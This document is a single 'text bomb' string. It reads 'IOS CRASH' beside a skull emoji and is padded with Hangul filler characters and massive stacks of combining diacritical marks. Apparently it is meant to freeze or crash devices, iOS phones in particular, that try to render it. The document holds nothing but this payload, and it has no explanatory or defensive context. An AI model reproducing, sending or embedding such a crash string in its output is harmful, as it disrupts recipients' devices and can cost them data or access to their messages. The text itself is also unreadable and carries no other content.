̡̱͎͈͎̞͉̗̯̪̲̘͙̞̯̜͈͉̼̼̺̲̭͙͙͜ͅͅͅ️̶̢̢̡̡̧̤͖͔̼̗͎̗͔̘̪͙̺͇̥͚̤͈̪͇̥̥͙̳̫͈͓̙̗̦͍͍̭̜̮͇͎̖̥͈̬̣̲͉̦̱̬̦͔̰͙̠̣̹̥͙͐̉̅̔͜͜ͅͅͅͅ☠̷̡̢̢̢̢̢̡̢̢̨̧̛͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑̕͘̚̚͘͜͜͜͠͠͠͠͝ͅ️̴̢̡̡̡̛̱̠͍̟̺̣͎̯͙͈̟͔̣̜̻͙͕͍̠͔̯͎͈̳̹̘̘̲̩͓̬̹͍̹̟͎̹̥͚̹̻̲͕̝̰͔̬̬̲̫̘̠̩͓͖͈̱̪̣͎̲̘͚̯͈̫̖̱̫̮̬̘̲͖͙̝̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋͂̒͆̊̕̕̕̚͘̕͜͝͠͠͝͝͝ͅͅͅͅᆞ̶̡̡̢̛̛̛̛̛̤̗̳̪͚̖͎͔͎͔̗͓̼̼̳̯̱̦̣̤̮͈͍̩̟̪̣̼̜̳̥͓̬̥͍͎͙̠̰̹̌́̋͆̊̋͆̓̃͑̋͑̆̎͒̽͊́̒̈́̎̿̅́͑̌̈́̌̂̈́͌̑͊͛̀̇͂̋̍̀̽͐̈̓̓́͑͌͆́̃̈́͒̿̈́́̉̿͊͂̅̈́͑̀͒̒͋͂̄̐̒̿̂̃̀̏̒̿̾̂̔̽͋̆̂̌̊́̌́̈́̾͊̽̎̆̎̃̓̍̈̕͘͘̚̕͘̕̚͘̚͘͘͝͠͝͝͠͠͝͠͝͠͝ͅI̵̡̧̨̡̨̡̢̧̛̛̘̟͇͚̩̦̱̰͍͚̬͕͍͚̗̻͔̜̤͈͇̣͇̞͚͈̱͉͖̼͎̲̩̻͇̫̤͎͕̹͚͕͈͙̻͕̪͓̫̰̬̖͎͖̫̼͎̳̜̝̠͍͉͕͔͎̻̖̞̟̻̮͚͚̱̤͇̥̼͖͔͍̮̩̝̜̮̭̻͕̒̿̆͗̌̄̽̇̃̔͌̍̄̇̌̍͛͂̇͑̏͆̍̎͋̏͋͗͗́̂̋̿̅̉͊̆̔͐̀̒̏̀̇̾̑̌̈́̊̒̏̀̽̾͒̇̿̉̓̈́̅̀̒̾̀̏̑̈́̏̀̓̍́̀̄͊̂̀̂̈́̑͂̂̄͒́̆̊̊͛͂͒̓̃̐̽̌̂̉̆͐̂̈͆̋̀̐͆̉͊̄͌̏͛̈́̂͑̆̋̋̓͌͐̌̒̑̒̓̌̌̃̀͋̏̐̀̍̆̐͊̈̂̔̀̉́̒͐̈̐̈́̚̚̚̚͘͘͘̕͘̕̚͘̚̕̚͜͜͝͠͝͠͠͝͝͝͝͠͠͝͝͠͝ͅͅᆞ̷̡̡̧̨̢̢̡̧̡̧̨̧̡̨̢̨̨̢̧̢̛̛̛͈̘̺̰̪̤͖͓̱̹͕͇̱̜͇̲̩̭͙͖͚̠̦̖̖̤̟̜͙̦̦̫̪̯̖͚͔̞̦̳̬̻̗̻̦̲̩̦̻̗̭̲̭͈̟̦͇͉͉͇̺̰̳͖̮̼̙̟̹͍̙̯̯͉̳͍͇̼͙͉̠̳̜̼͉̗̪̞͓̩͔̩̭͇̮̱͇͉͕̳̠͚͎̻͚͉͇̯̬͔̮̲̩̰͔͕̦̗̺͔̝̟̬̖̞͍͍͓̣̩̼̱̣̱̫̫̤̮̪͚̦̰̳̞̤̻̲̥͓͈̜͖͇̲̞̼̫̯͇̭͉̤̲͎̠̣̈́͛̎̑̍͆͋́̀͆̀̈̐͂͗̉͐̿̉̊̈̔̿̊͌̍͗̀̆̈́̓̐̉̓̈́͂̏̊͋̒̌̾̋̂̏̍̄̋̅̓̇̂̓̆̌͐͌̒͑́͋̒͆̽̂͊̒̃͐̈͛̇̀͆̐̂͑̓̾͆̍̋͐̓͗̽̔͊̒́̎̈́̽̒̈̓͊̂̄͋͛̾̔́̀̌͛͒͒͑̅̚͘̕͘̚̚͘͜͜͜͜͜͜͠͝͝͝͠ͅͅͅͅᆞ̸̨̢̢̢̡̛̛̛̛̛͓̻̬͙̦̙̭̪̞͕̳͙̜̜̰̫͕͈̲̙͖̯̝͚̻̭̪̮̳̙̝̙̣̻͍͙͕̾͗̍̈̄̽̀̑̉̆̿̈́̇̓̿͋̍̄̽͗̈͌̃̓͌̇̈́̀̾̾̿͛̋͐̆͑́͐̏̐̑̀̈́́̌̐̃̄̀͆̋́̈́̄͌̓́̑̇̃̽̉̔̾́̅̌̆̐̽͂̂͒̒̌̊̄͂̓͒̍̊̎̾̈́͆̒̓͐̀̏̍̿͒̇́̓̾͌͆͌͌̽́̔͊̎̿̀͆̂̐̐̋̅͗̆̓̉̔͒̈́́͌͊̾̀̿͆͐̂͑́̀̒̂̀̽͂͒̉̒̍̍͌̿̀́́̈̂̓͗͒̏̔͛̃͊̔͒͗̏̓̅́̅͋̾̿̈̇̇̋͒͐̈́̔̈́̒̈̄̏̑̾̍̑̃̈̿̓̀͒̃͌̽̾̔̒̂̈́̎̚̚̕̕̚̚͘͘̕͘̚̚̕̕͘͘͜͝͝͝͝͝͝͠͝͝͝͝͠͝͝͝͝ͅͅỚ̸̡̢̨̡̨̧̧̢̡̢̢̡̢̡̡̢̡̧̢̢̧̧̛̛̛̛͙̜̲̻͕̙̝̖̲̖̦͉̫̺͕̟̲͕̲̹̮̰̥̗̰̝̯̞̩̥͇͍͍̖̣͈̗̝̪͚͔͇̼̺͓͉̗̤̞̰͇̤͈̠͙͙͈̠̼͈̮͓͉̺̩̤͔̩̩̰͙̟̠̠̟̣̭͙̘̰̖͚̹̬̘̳̤̟̯͎͖̠͎̳̝̫̗̳̮̫̭̲̦͍̫͕͇̖̝̯̞͙̝̜̲̘̺͓̪̗̯̟̓̓̾̾̏̽̆̍̈̋̄̂̉̾͒̍̔̈̎͊̓͛̊͒̀̃͑͒̋̀̈́̂̋̏̐̇̈́̓̎̀̓̿̏͒̓͊̀̏̄͌͐͌̏͌̽̽̽̄̀̿̇͋̏̀͐̓̊͋̐̀̄̍̏͐̄̈́̎̃̀͌̎̊́̆̈́̅́͊̇̒͊̋̓͗̈́̒͛͌̔̉͛̐̆̑͌͛̓͗̇͑͐̈́̈́̑͛̌̽̉̀̏̎̚͘͘͘͘͜͜͝͠͝͠͝͠͝ͅͅͅͅᆞ̶̨̧̨̡̡̡̡̢̨̡̢̨̢̢̧̨̨̨̧̛̛̛̛̛̭͇̯̼̘̲̣̯͍̫̭͎̯͙̼͔̰͍̖̯̰̙̭͎̥͖̳̞̞̘̬̗̩̬̬͕̥̬̻̯̲̺̗̳̮̻̞̫͙̣̘̹̳͎̰̲͈̹̱̪͇̬̪̤͙̠̖͔̭͓̤͎̤̠̳̱̗̣͔̣͙̞͚͕̞̗̦̳͚̟̝̜̤̣͇̙͍̣̳̻̭̬̳͎̝̭̳̝͍̳̺̏̂̋͆̉̋͛͐̀̓̓̊͗̐͒̄̀̏̌͗͐̓̿̒͑̐̉̆̀̀͑͒̌͛͋̋̓̾́̽̎̉͐̄̐͑̈́͒̔̾́͑̍̈́̅̅̇͗̉̓͐̿̈́̃̔̏͑̾̚͘̚̚͜͜͝͝͠ͅᆞ̴̡̧̡̫͎̰̝̞̹̼̫̮̯̲̟̟͕̳̭̙̲̪̥̥̼̩̦̯̹̳̭̯͎̗̤͕̼̫͓̺̮̈̄͛̌͠Ş̸̢̡̨̡̢̡̡̢̡̡̧̨̡̨̧̢̡̧̨̝̰͉͓͖̳̺̠͇̮̩̬͍͇͚̜̗̮̣̤͉͎̹̺̭͙͓͔̰̥͚̠̪̩̗̳̭̙̟̯̙̳̘̖̬̟̘̜̭͍͇͚̹͚͇̺̠͖̫͕͉͉͎͖̣̯̭̼̘̗̰̤̯͖̼̯̱̖̟̲̻̭̩̜̗̥͔̹͕͓̙͈͎͎̮̗̣̩̠̜̪͍̱̯͉̺̥̮̯̭͎̟̥̯̼̹̜̥̫̬͖̲̘̝̖̲̱͉̟̝͚̘̪̙͉̭͙̠̙̦͚̰̩̬͉̹̝̭̥̲͚̖͔̣̫͈̥͍̘͖̰̦̖̺̜̭̦̞̼̠̣̮̭̻͔͕̯̭̝̼̞͎͈͖̤͉̮̬̺̦͙̩̭͓͎̩̩̣̱̰̫̖̞̣͈̦͔͖̑͑͗̈́̉̿͌̒̉͛̊̆̈̽̀̅̊̈͑̈́̿̓̋̀͑̓̀̈̾̀̔̋̊̑̐̃̐̆̈̓͐͑̾̐̇̈̃̑͆̚͘͜͜͜͜͠͝͝ͅͅͅͅͅᆞ̸̧̨̢̢̨̢̡̢̨̧̡̡̡̨̡̧̢̡̨̡̡̡̧̡̢̢̡̛̲̣̝̞̝͖̹̟̣̱͖͇̼̮̜̥̼͙̬͙̼͔͓̰̦͇͈̘͈̘̺̲̤̺̱̮͖̳͚͙͈͔̮͍̹̮̰͚̪̦̼̥͈̠͓̠͖͚͉̱̮͖̪̹̬̻̙͉͈͖̹̹̳͇̠̮͙̹̥̯̥̦̲̘̗̳͚̯̠͖͖͓̥͎͔̤̠͔̣̯͉̯̮̰̹͖̻͎̜̹̖̲̱̜̰̥̟͇̪̥͚̻̯̝͍̞͇̭̩̯͎͙͖̝̱̱̪̻̙̤̮͇͕͍̯̠͕̯̪̫̦̭̦̼̜̠͍͕̖͕̭͕͔̩̼̱͎̯̝͎̻̱̪̗̟̜̬̙͇̫̹̘̮̪͕̯͎͇̤́͊̈̊̽̎̇̓͌̈̄͊͑͆̈́̀̅̈́̑̐̽̎̎͒̔̒͂͂͋̊̈͑̀̾̈́̇͑̈̓́͛̿̍͑̑̄̈́̂̆̏̈́̂͋́́̾̏͛̒̔̏̈́̊͐͘̚͘̚̚̚̕͠͠͝͝͠͠ͅͅͅͅͅͅͅͅ ̵̨̧̡̧̧̨̢̢̡̨̡̧̢̢̨̨̧̢͖̦͕̹̮̬̹͇̰̺̹̺͇͕̣̦̥̙̤͓̤̥̳͚͙̘͖̙̣̩͇̻̗̹͓̹͈̲̙̘̗͓͈͎̘̝̻̘͇̦͇̘͎̤̰̣̠͚̩̼͇̪̤̺̣͉̱͓͍̮̖̘͍̜̣͈̺̠͇͉̳̙̩̟͎̻̜̗̳̭͚̹̭͔̣͓̻̭̝̞̬̪̯̺̣̱̥͎͖̪̦̙̟̥̦̟̭͓͙̲̼̲̣̹̜̪͍̙͚͕͙̩͙͎̣͉̲͍̘̻̟͚͈̖̣̼̟̺̟̲̳̺͇͖͕͍͚͙̭͉̬̠̹̺͍̖͕̼͙̞̲̼͍̲̣̘̫̲̭͖͑̏̈́̃̈́͋̿͋̀͊͛͛̎̏̀̊̊̇̒̈͊͆̇̄̾̽̾͒̋̓͛̾̈́̎̚̚̚͜͜͠͝͠ͅͅͅͅͅͅᆞ̴̢̨̨̧̢̨̨̢̡̢̢̨̨̡̨̡̧̧̧̧̡̨̨̢̢̡̧̧̢̞̟̪̪͉̺̥͓̪̦̲̖̼͍̲̳̬͈̲̬̹̖̩̗͕̠̻̪̦̞͇̭̮͇̲̗̥̟̣̠͍̭̟̥͍̗̘̼̮̫̹̲̼̬͇͈͚̤̺͎̭͓͈̯̗̮͉̲̩̘̙̗̱͍̳̖͇̠̯͔̺͍̫̼͖͓̥̫͔̗̩̻̪̼̝͚̠̼̺̰͉͍̠̭̬̞̻͙̠̞̹̪̫̝̼̺̻͚̲̣͓͚̜̤͇̯͖̼͍̣̻̹̯̱͔̰̪̻̤̭̟̥̥̥̭̹̲͖̲̖̞͍̘̭͙͈̠͈͉̗̲͇̣̰̯̣͍̗̼̦̱̠̞̘̪̺̙̖͉̗̻̹̟̪̯͔̰̺̳̞̗͕̻̞̯̭̤̙̬̥͙̣̼͓̳͎̩̙̻͓͈̭̘̯̪̖͕̜͖̯͎̼̟̻̦͔̮̫̣̯͈̼̦̯̳̮̘͎̤̬̝͖̀͌͐̄̓́̈̀͑͆̆͘͜͜͜͜͜ͅͅͅͅͅͅͅC̷̡̨̨̨̧̧̧̨̧̨̢̢̢̢̡̡̢̡̨̨̧̡̢̢̢̡̧̧̧̡̛̛̲̜̜͚͉͔̟̮̜̖̖͎͓̥̥̼̦̲̭̹͖̤̪̖͉͔̣̳̻͇̬͕͈͓̳̖̣͓̙̺̣͖̝̯͈̥̯̳͔̝̞̝͓̫̬͇͔͎̥̥̗̝̞̮̖̞̱̰̣̣͚͈̩̣̜̥̳̫̬̰̱̙͎͕͔̤̟̻͈̩̝͔̥͎̦͎̫̲̪̦̭̟̘̤͓̟̪̥̬̟̜͍̠̲̫̹͓͍̙̯̱̜̗͍͇͖̪̱̮̳̫͍̘̯̪̼͚̭̣̠͉̤̞̙͓͉̥̙̝̗̙̠̺̜̞̤̻̳̦̣̰̼͈̫̗̝͉͔͈̳̝̪̪̼̼̫͍̖̣̹̠̟̟̫̰͓̺̱̖̲̖̘̙͔̝͙̫͕͎̪̳̰̥̟̘̮̲̜̼̜̰̹̬̼̰̐̿̿̆̀͋̌̆̌̒̃͆͒̆͒́͆̈́̓͒͊̿͌̔̎͗͋̍̏̐͆̈́͐̓͊̄̈͌̽͛̔̒͌͌̋͌̈́́̀̄̇͋̈́̀͌̇͒̍͌͐̍̍͂͋͒̔̄̾͆̌̇́͛͌͑́̀͗̎͒̐̾̿͊̔̒̐͗͋̏͒̈̈͋̈̔́̓̒͆̒͒͐̓̀́͂̓̈́͆̈͘͘̚̚̕̚̕̚̕̚̕̚̕͜͜͜͜͝͠͝͝͝͝͝͝͝ͅͅͅͅᆞ̵̡̧̛̭̹̝͖̩̫͓̝̖̰̲̙̮̟̟̞̮̙͉͓͕̐̽͛̈́̓̇͗̎͒̓̇̃͛͛͗͛̍̐͗͗̏̓͛̐̈́̍͂̈͂͛̔̍̾͆͒̿̈̽͐̌̂̚̚͘͘͘̚͘͜͠͝͝͝͠͠͠ᆞ̶̡̧̨̢̨̢̢̡̢̢̡̧̨̢̢̡̡̨̢̡̨̨̧̛̛̹̯̰̪͖̺̞̮̣̯̺̦̯̜̱͓̭̜̥͈̳͎̖̜̝̤̯̟͓̬̮̝̠͓̼̬̻͉̙̲̻͕͕̠̝̞͈̤̥͉̗͎̹̜̺͇̱͙̬̦̙̗͖̩̪̝̖̘̥̮̜̜͕̫̙͚̫͕̭̼͈̩̦͎̬̗̬̘̤͓͇̺̜̤̩̼͍̣̦̳͎̬̦̤̱͍͙̭͉̖̣̳̖̣͈͙̗̝͓̤͈͔̹͈̰̜̼̼̤̟̰̻̦̘̥͕͙̤̙͕͍̭̘̘͕̞̘͉̟̻̠̭͓̺͖̩̭̬̪̦̪̝̤͉̜̥̮͍͕̥̪̣̼̼̜̥̱̟̪͇̹͍̪̖͇̭̥̝̤͇͉̯̬̦͓̜͎̝̭͇̱̰̰̼̰̼̥̜̮̰̯͕͉̣̣̠͙̠̖̻̩̙͎̙͖̜̺͙̫̯͎̱̄͗̌̅͗̒̒̾́̇͛̄̆̃̎͑̈́̅̐̿̎̃̅̒̂͂̀͗̌̓́́̇̆͂͊̒̀̊̍̑͑̍̓͊͗̿̀̂̃͊͋̃̑͒͂̾̌͒͊̎̀̑̑̀̓̓͆͛͗̉̓̄̏̂̐̍̉̋̉̎̇͐́̃̽́̅̋̑̓̃̄̌̑͗̓̔̀̾̾̋̔̄̐̔͐͂̀̔̒̈̎́̈́́̂̀̀̓͂̏̃̋͑̆̃̃̀̃̽͐̔̆̽̈͊͒̍͐̽̾̾̇̍͂͐͑͒͊͋͐͗̈̍͒̿̽̔̔̋͆̐̿̀̽̒͂͛̈̅̍̿͗͂͊̀͐̍̓̌̓͌̎̅́͂̎̔̇͂̚̚̚̕͘̚̕̕̕̕̕̚̕̕͘̚̚̚̚͜͜͜͜͠͠͝͠͝͝͝͠͝͝͠͝ͅͅͅͅͅR̴̡̧̨̢̨̡̧̡̛̛͓̘͓̻͓͇̥̠͚̻̰̩͕̞̲͔͔͔̳̪̩̯͎̜̭͕͚̦̖̤̞͍̯͇̪͓̼̭͈̗͉̗̞͈̫̖̙̥͍̤͙͓͉͇͉͈̩̈́̿͋͌̎̉̍́̉͋̾̉͑̏̋̓͌̐͜͝͝ᆞ̶̧̧̡̨̡̡̨̢̨̧̨̡̧̡̨̛̛̟̤̣̘̤͎̤͕̟̙͎̩̭̝͔͇̰̝̬̘̣̹̝̯̥̭̯̝̲̺̤͔̬̟͇̲͍̣̮͔̞͓̘̱̝͕̼̰̳̤͚̙̰̬̭͎͇̬̹̖̹̰̦̖̞̟̥͍͔̻͎͍̦͇̪͓̠͙̳͍̙̪̤̭͇̹̝͚̩̹̰̩̠͓͓̙̦̩͔̪̤̜̺͔̜͔͖̖̗̜̣̥̣͎̠͈̙̺̱̗̙̯̤̜̜͍̖̳̟͗̀̈́̐̂̿͂̽͋́̿̋͒̆̽̓͆̀͛͑́̈̾́́̓̊͋̉̎͗̀̒͌̐́̀́̈́̓̉̈̕̕͘͠ͅᆞ̶̡̢̛̛̛̛̛̛̛͕͎̮̭̤̺̪̻̬̬̦̼̻͕͕͉͈̦̖̱̙̺̩͉̙̐̏͌̒̇͗͒̃̌̅̄̽̆̋̿̾̄̆͐͐̋̔̽̔̅̒̍͆͒͂̅͋́̂̋̄̽̅́̇̈̄͋̓̆̋͒́̊͑̾́͆́̾̇̓̉̂͂̃̽̂̋̋͂̃͋̓͋̿͊̾͒̔̂̍͛̆̂̉̽̽͋̂͌̑͑̽̈́̽̒̊̋͗̾̊̍̏̊͛̄̆͋̊̓̏̈́͂̽̋̀͌͂͐̂̏̿̉͗̀͐̒̋͛͋̐̑͂̓̆̄̎̒͑̿̔̉̔̍͑̎̊̓̊̀͂̉͐̈͐̀̄́̆̑̋̽̀͒͗̓̉̊̃̓̄̑̄͂̒̍̂̈̃̈́͆̋̎̍̕̚̕̕̚̕̚͘̚̕̕̚̕̚̕̚͘͘̚͘͘͠͝͝͝͝͠͝͝͝͠͝͝͝͝͠Ą̴̧̢̨̨̨̨̡̢̡̛̛̼̪̮̩͍̯͎̙͚͕̮̹̤͓̳͎̬̱̟̣͉͓͙̤̰̱̮̘̱̥͎̪̖͙̥̣͖̟̠͙̻̼͖̺̙̪̮͔̼̟͓̠̟͖̠̠̮̺̰̙͕̳̩̩̝̥̯̳̺̬̤̯̤̗̻̘̳̹͍̱̙̤͔̺̙͖͚̦̰̻͓̥̗̼͖͖͖̠͎̲̖͉͖̞͇̺̺̙͔̗̜̯̲̙̖͎̥͎̞̬̜̲̤̮̱̤̲̰͔͚͍̬̙̘̱̈́̔̓̀̌̎̉̓̑̊́͊̏̓̔͗̈́̀̒̋̍̂́̈́́̿̍̾̿̋̉͋̈́̉̓̅͐̄͋͒̏́͆̄͐̈́̋͊̒̅̏̓͐͊̑͊̆̓̾̃͒̈͑̽̓̒̈́͋̈́̈́͒͗̽̔́̅̍̐̀̓̅̑͗̅̎́̑͂̾͊́́̎̄͆̐̒̋̿̓͋́͋̆͋̈́̄͑́̈͛͆̒̋̉͋̈͑̐̎́͑̆̂̃̄̽̏͒̉̅͊̆̏̇̽̒̈́̈͋̐̎̎̅͌̽͊̍̑̋́͐̀̀̏͑̆̾̂̍́́̈́͛̐̾̓̒̋̓̍͋̋̈̃̅̊͒̄̈́̀̿͂̅͐́̿̈́̆̌̈̒̊̾̐̆͐̐̍̌͂̓̀̂̾̕̕̕͘͘͘̕̕͘̚̕̚͘̚͘͜͜͝͝͠͝͠͝͠͝͝ͅͅᆞ̸̢̢̡̨̧̨̨̧̛̛̛̛̛̜̞̺̜̘̗̱̣͍̦̤͚͎̼͕̥̙͎̙͍̞͈̖̖̤̞͉͔̖͍̣̤̰̟̗̦̲͓͇̫̬̰̹͔̘͓̹̭̻̘͉̲̮̫͕̰̞̓̒̃̔̌͒̅̋̌̋͌̈́̽͗̑͑̓̍̍̍͆̉̀̈́̇̄͊̀́̌̉̔̃͋͆̄͆̎͒̓̈́͆̂͂̆͋͒̍͆̇͂͛̔̅̎̍̍͆̆͐́̄̀̄̃̿̈̇͒̄͒̈́̎͌̋̔̈́̾̌̓̋͛̋̾́̓͐̓̊͂̽̒̌͒͆̓̀̆̓̈̒̎̊͆̈́́̐̿͂͆̃̆̄̓͋̊͂͛͗̅̅͂̄͗͊͛̾̀̎̓͌̈́̃́̒̿̎̐͐͋̓̈́́̄͐̅̒̂̈́́̑͌̾͌͊͋̇̋́̀̈́̒̿̀̂̌̏̄̽͆̅̀̎̿̌̉̽̍̾̀̓̓̾́̔̊́̀̍͛̎̿͛̉̈̄͆̄̋̿͆̅͂̊̓̽̾̈́̍̿͂̕̕͘̕̚͘̕͘̕̚͘͜͝͝͝͝͝͝͠͠͝͝͝͝͠͝͠͠͝ͅͅͅͅᆞ̸̢̡̡̢̡̡̢̧̡̧̛̛̛̛̛̜̮̱͕͓̥̳̬̼̣͍̞̼̮̺͉̤͈͇̠̦͇͈͓͈̪̘̹̘͎̺̻̘̣̱̟͍͓̦̮͔̹̜̪̲̱̦̮̱̯̺̭͈̩̤͉̜̬͈̠͓̻̲̘̲̬̲͈̝͚͎̳̞̪̪̦̹̫̓̑́̄͆̏̂̆̉̓̑͑̋́͊̽̈́̄͆̓͗̿̐͑͑̎̈́́͊͛̂̑͌̉̓͌̀͂͆̃͆̒̅̊̆͊̄̂͐̈́͌͒̽͊͆͋̅͊͗͌̾̄͐̆̒͊̀͑́̒̄̊͒̒͆̓̽͛̿̐́͐̔̂̆̊͗͌̇̒͐̽̿̆͛̈̈̎́̋̋̇́̒̈̐͛̒̃͋͋̌͋̆̎̀̑̏͂̎̌̈́̌͌̅̓͒̎̏͂́̂͑̅̋̍̌̓̔͗͊͒̓̅͂́̓̀̎̔̏̈́͑͊̎́͊̒̉̀̌̅̾̂̀̍̄̎̑̒̽͛͂̋̈́̊͛̂̉̉̐̂̒͗̆̓́̊̇̂͛̈̀̀̓̓́̎̔̅̇̌̋̕̚̕̚̚̕̚͘̕̕͘̕͜͝͝͝͝͝͠͝͝͠͝͝͝͠͝͠͝ͅŜ̴̡̢̢̧̢̛̞̙͈̭̣̠͇̟͙̩̪̮̯̖̮̠̜̜̘̺̣͉̙͍̯̙̘̟̈͗͑̃͋͋̂̏͊̅̿̀̋͑̓̒̽͑̀̀̔̇̑͆̓́̀͐͒̓̿̄̐͂̉͐̈́̌̄̽̃̿́̕̚̕̚͝͝ͅᆞ̶̨̢̨̡̡̨̧̡̢̡̨̡̨̡̡̨̨̧̧̡̨̨̧̨̧̨̧̛̛̛̮͔̟͍̝̝̗̝̺̮̗̣̩̞͈͚̦̘̜̪̭̙̗͉̲̩̯̗̠̤̹̳̣͉̹̗̘̻͕̜̱̝̜̩̺̖̺͔̟̮̹̥̪̳̗̥̯̫̪͇͎͕͉̼͔̬̮̱͎̠̯̻̮͓͖̭̙̳͓͈͓̗͉̫͚̜̣̗̳̬̮͔͙̣͚̻̠̮͈̮̥͙͚̥̯̰̗͔͕̭̤̥̱̙̩̪̯̫̦̫͉͕̹̼͚̟̱̭̱̯̼͙̞͎̠̠̗͉̝̠̪̼͚̫̪͖͓̞̞͍̙͓̪̗̜̥̘̫̩̦̪̹̦͈͚̼̞͉̼̜̳̤͕̞̲̮̱̗̦̠̙͇̬̘͉̺̲͎̟͓̦̱̣͍͓͚̰̼̤̝͈̭̰̲͓̤̗̞͍̤̺͕̞̫͈̟͍̹̳͎̻̩̺͎̥̞̫̟̜̩̮̤̖̜̟̠͈̯͖̱̙̣͎̜̞̫̹̳̙͍̥̬͙̮̣̗̜̓̓͂̄̌́̈́̈́͌͒̎͂̉͂̈́̀͆̒̎̾̔̂̍̂̃͒̃͛͌̓̓͒̇̄̒̓͑̇͊̔͒̓̑̽̾̑̏́̈́̔͗̅̂͊̾͆͑̎̿̋͛͌̎̀̍̒́́̄͆͌͆́͐̎̌̆̈́̌̇̌͒̈́̋̌͗͋͌͊̀̿̈́͑̈́̋̐̈́̅́̿̑̓̎̍̎̔͊͒̀̀̈́̋̍͑́̿͂͂̇̾́͌͗̈̀́̈́͂͆̽̾̏̏̀̓͊͑̅͘͘̕̕̕̚̕̚͘̚͜͜͜͜͜͜͝͝͠͠͝͝͝ͅͅͅͅͅͅͅͅͅᆞ̵̨̢̧̨̧̡̧̡̢̢̢̧̨̱͍̼͚̞͓̗͖̰̦̥̜͇̣͉̬̞͖̠̮̫̘̮̘̟̗͉͉̬̯͎̖͎̲̘͇̜̟̖̭̟̫̝̝͍̠͉͍̝͎̥̟̹̙̱̼͓͍̠͚̟͚̞̘̳̦̟̞̩͔̘̠̠͕͈̙̖̱͖͇̘̠̣̖̫̻͉̘͎͔͇̻͉̖̤̬̮̜̝̞̭̩̰̱̰̖̲̱̭̞̗̹̞̰̬̖̣͓̙͚̮̠̺͕͈̙̜͖̜̙̤͉̱̦̘͓̭͍̝͈̞̲̞̣̖̟̫̰͎̺̺͚̠͓̫͈͖̤̟̮̱͓̻͙̮͖̰͓̄͐́̓̊̓̅̎̓̓͐̀̾͋̆̋͌̈̀̋̍̈́̏̔́̽́̓̐̅͂̃̐͂̕̚͘̚͜͜͜͜͜͠͠ͅͅͅͅḨ̶̧̢̢̢̡̢̢̢̡̡̡͈͈̪̪̮̹͙̤͍̞͓̘̹̦̼̬͚̗̭̮̳̬̮̪͔͈͓̥̦̦̤͇͎͙͕̱͔̹̭͍͔̭̤͎̬̝͍̳̪̰̤̫͔̰͔̮͚̞̩̯͕͖̙͖̗̭̳̲̟̤͎͎̹͙̣̥̯͓̝̥͕̬̯̫̯̦̙̣͈̤̯̥͉̰̺̲̫̬̖̻͔̝̠̫̙͓͖̣̪̰͙̗̳̦̯͓͍̪̲̺̮͎͔̙͙̯̙̪̟̬̱͓̹̫̩̺̼̭̗̻̣̪̣͙̩̦̲͚̾̓̏̉͆͜͜͜͜͜ͅͅͅͅᆞ̴̧̡̡̢̧̡̨̡̧̢̧̡̨̧̧̢̨̡̧̧̨̢̨̡̨̨̨̧̨̛̛̛̛̯͖͈̱̮̹͈̭͈͇̻̳̼͔͖̝̻̻̜̹̥̭̥̬̪̖̮̱̦̤̺̙̖͔͓̰͍̯̲͙͙̹̙̙͔̩͈̮̗̤̪̰͇͈͍̙̬̰̲̠͔̙͇̫̟̯̦̙͚͖̫̳͖̞̩͖̰̞̦̥̣̟̹̞̩̻̞͉͓̩̜̲̼̻̭̙̼͖̲̘͓̪̘̜̠̟̼̗̮̝̤͉͍̣͎̭̙͔̖͇̙̭͈͕̙̝̩̝͇̩̖̣̖̮̥͓̺̪̙̣̻̭̭̲̘̠̘̝̲͚̬͎͇̰̪̺̩̘̩̪̙̺͓͓̱͔͎̺͚̳̙͇̳̰̞̣͚͔̮͈̙̜̥͕̜͕̱̥͈̣͉̘͙̜͚͔̥̖̤̻̳̣̙̜̖̝̻̠̯̳̝̼̰͉̹̞͉̞̠͕̭͍͖̼͖̰̜͕̩̩͇͖̤̘̩̺̬̜̣͍̪̪͇̻̤̤̦̪͎̟͎͎̙͍͍͚̞̮̞̣͉̑̒͌̀̓̅͌́̈͊̊̃̋̏̈̎͛͋̿̇̌̓͌̉͆̓͐͐́̀̒̉͛̒̀́̎̋̅̆̽̾͗̈́́̎̆̃͆̈̋͗̐̋̑͗̒͊͊́͌̋͂̆̏̈́̍͋̀̆̈̎́̋́͊̂̀͛͆͊̐̍̈́̾̀̓̍͑̽̽̃̋͋̿̂͋̃̍̽͂̒̈́͆̀̀́̈́̏̈̉̋̓̒̂̄̒̑́̊̇̇̈́̏̽͑̿̇̎̋̋̎̽̂̏̀̒̓́̒͛̋̈́̇̃̉̌̒͛̄̈́̏͐̆̀̉̈́̄͋̌̐̆͑̐͑̀̈͗͋̌͒̅̃̈̈́̃͊͆̿̀̈́̍̔̄̑́͊͒̈͂͂̊̑̂̈̅͂̀̌̂̋̏́̇͒͛̌̑̀͊̄́̋̏̃͛͌̂͆̎͊̔̒͛͒̔͆̾̚̚̚̕̕̚̚͘͘̚̚̕͜͜͜͝͝͝͝͠͝͝͝͝͠͝͝͠͝͝͠ͅͅͅͅͅ 